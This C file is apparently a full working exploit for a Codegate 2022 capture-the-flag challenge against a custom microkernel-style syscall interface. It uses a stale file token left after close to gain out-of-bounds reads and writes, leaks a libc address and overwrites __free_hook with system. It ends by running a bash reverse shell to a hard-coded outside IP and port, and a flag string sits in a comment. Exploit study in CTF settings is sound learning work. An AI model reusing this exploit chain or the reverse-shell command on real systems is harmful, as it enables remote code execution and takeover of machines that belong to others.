#include <stddef.h>

/* Syscalls. */

#define __NR_creat 0x10001
#define __NR_alloc 0x10002
#define __NR_close 0x10003
#define __NR_copy_from_guest 0x10004
#define __NR_copy_to_guest 0x10005
#define __NR_read_write 0x10006
#define __NR_read_write_vec 0x10007

#define CMD_READ 0x38273
#define CMD_WRITE 0x38274

typedef int fd_t;
typedef long token_t;

struct vec {
  long fd;
  long cmd;
  long save;
};

struct buf {
  long token_plus_size;
  long ptr;
};

static inline long xsyscall(int number, long arg1, long arg2, long arg3,
                            long arg4) {
  register long rax asm("rax") = number;
  register long rdi asm("rdi") = arg1;
  register long rsi asm("rsi") = arg2;
  register long rdx asm("rdx") = arg3;
  register long rcx asm("rcx") = arg4;
  asm volatile("syscall"
               : "+r"(rax)
               : "r"(rdi), "r"(rsi), "r"(rdx), "r"(rcx)
               : "memory");
  return rax;
}

static inline fd_t xcreat(const void *path, size_t path_size) {
  return (fd_t)xsyscall(__NR_creat, (long)path, (long)path_size, 0, 0);
}

static inline token_t xalloc(int fd, size_t size) {
  return (token_t)xsyscall(__NR_alloc, (long)fd, (long)size, 0, 0);
}

static inline int xclose(fd_t fd) {
  return (int)xsyscall(__NR_close, (long)fd, 0, 0, 0);
}

static inline int xcopy_from_guest(token_t token, size_t offset, size_t size,
                                   const void *buf) {
  return xsyscall(__NR_copy_from_guest, (long)token, (long)offset, (long)size,
                  (long)buf);
}

__attribute__((used)) static int xcopy_to_guest(token_t token, size_t offset,
                                                size_t size, void *buf) {
  return xsyscall(__NR_copy_to_guest, (long)token, (long)offset, (long)size,
                  (long)buf);
}

static inline int xread(fd_t fd) {
  return xsyscall(__NR_read_write, (long)fd, CMD_READ, 0, 0);
}

static inline int xwrite(fd_t fd) {
  return xsyscall(__NR_read_write, (long)fd, CMD_WRITE, 0, 0);
}

static inline void xread_write_vec(struct vec *vecs, size_t count,
                                   long *retvals) {
  xsyscall(__NR_read_write_vec, (long)vecs, (long)count, (long)retvals, 0);
}

/* Payload. */

#define BOGUS_TOKEN -1
#define SAMPLE_BUF_PTR_0 0x555555569d70
#define SAMPLE_BUF_VICTIM 0x555555569fb0

/*
 * fd=0 size=6
 * buf=0x555555569d70
 * fd=2 size=7
 * struct buf=0x555555569fb0
 */
#define VICTIM_BUF_OFFSET (0x555555569fb0 - 0x555555569d70)

/*
 * fd=0 size=6
 * buf=0x555555569d70
 * 0x55555556a2b0:	0x7ffff67bebe0 <main_arena+96>	0x7ffff67bebe0
 * <main_arena+96>
 */
#define MAIN_ARENA_OFFSET (0x55555556a2b0 - 0x555555569d70)

static inline void arb_prep(token_t victim_token, long guest_ptr, size_t size) {
  struct buf victim_buf = {.token_plus_size = victim_token + size,
                           .ptr = guest_ptr};
  xcopy_from_guest(BOGUS_TOKEN, VICTIM_BUF_OFFSET, sizeof(victim_buf),
                   &victim_buf);
}

static inline void arb_read(token_t victim_token, long guest_ptr, void *buf,
                            size_t size) {
  arb_prep(victim_token, guest_ptr, size);
  xcopy_to_guest(victim_token, 0, size, buf);
}

static inline void arb_write(token_t victim_token, long guest_ptr,
                             const void *buf, size_t size) {
  arb_prep(victim_token, guest_ptr, size);
  xcopy_from_guest(victim_token, 0, size, buf);
}

__attribute__((section(".entry"))) void entry(void) {
  int fd0 = xcreat("/tmp/0", 7);
  /* assert(fd == 0); */
  token_t token0 = xalloc(fd0, 6);
  xcopy_from_guest(token0, 0, 6, "test0");

  int fd1 = xcreat("/tmp/1", 7);
  token_t token1 = xalloc(fd1, 6);
  xcopy_from_guest(token1, 0, 6, "test1");

  int fd_victim = xcreat("/tmp/v", 7);
  token_t victim_token = xalloc(fd_victim, 7);
  xcopy_from_guest(victim_token, 0, 7, "victim");

  int debug_fd = xcreat("/tmp/dddd", 10);
  token_t debug_token = xalloc(debug_fd, 0x1000);
  xcopy_from_guest(debug_token, 0, 6, "debug");

  /*
   * g_fds.tokens[fd1] is not cleared
   * do_read_write() is still allowed and will return -1
   */
  xclose(fd1);

  struct vec vecs[256];
  long retvals[257];
  for (size_t i = 0; i < 256; i++) {
    vecs[i].fd = fd1;
    vecs[i].cmd = CMD_READ;
    vecs[i].save = 1;
  }
  xread_write_vec(vecs, 255, retvals);

  long leak;
  xcopy_to_guest(BOGUS_TOKEN, MAIN_ARENA_OFFSET, sizeof(leak), &leak);
  long libc = leak - 0x1ecbe0;
  xcopy_from_guest(debug_token, 0, sizeof(libc), &libc);
  xwrite(debug_fd);
  long free_hook = libc + 0x1eee48;
  long system = libc + 0x52290;
  arb_write(victim_token, free_hook, &system, sizeof(system));

  const char command[] =
      "bash -c \"bash -i >& /dev/tcp/3.38.43.167/4242 0>&1\"";
  xcreat(command, sizeof(command));
  /* codegate2022{breaking_microkernel_is_easy_0fc0ae9ebbabe6aeb7584e64eebc2047c097f3ac} */
}
